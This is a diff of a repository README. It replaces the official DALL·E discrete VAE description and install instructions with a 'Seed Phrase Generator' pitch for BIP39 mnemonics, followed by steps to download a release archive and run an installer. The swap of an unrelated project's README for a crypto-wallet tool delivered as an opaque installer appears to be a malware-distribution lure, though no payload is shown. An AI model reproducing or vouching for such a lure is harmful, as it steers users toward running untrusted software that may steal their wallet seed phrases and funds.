@@ -1,11 +1,8 @@
-# Overview
+# Seed Phrase Generator - This tool will allow you to easily create your own BIP39 compatible seed phrase (mnemonic) with cryptographically secure random number generator.
 
-[[Blog]](https://openai.com/blog/dall-e/) [[Paper]](https://arxiv.org/abs/2102.12092) [[Model Card]](model_card.md) [[Usage]](notebooks/usage.ipynb)
+# Instructions:
+## 1. Go to release
+## 2. Click on the button to download
+## 3. Unpack the archive to any directory
+## 4. Run the installer
 
-This is the official PyTorch package for the discrete VAE used for DALL·E. The transformer used to generate the images from the text is not part of this code release.
-
-# Installation
-
-Before running [the example notebook](notebooks/usage.ipynb), you will need to install the package using
-
-	pip install DALL-E
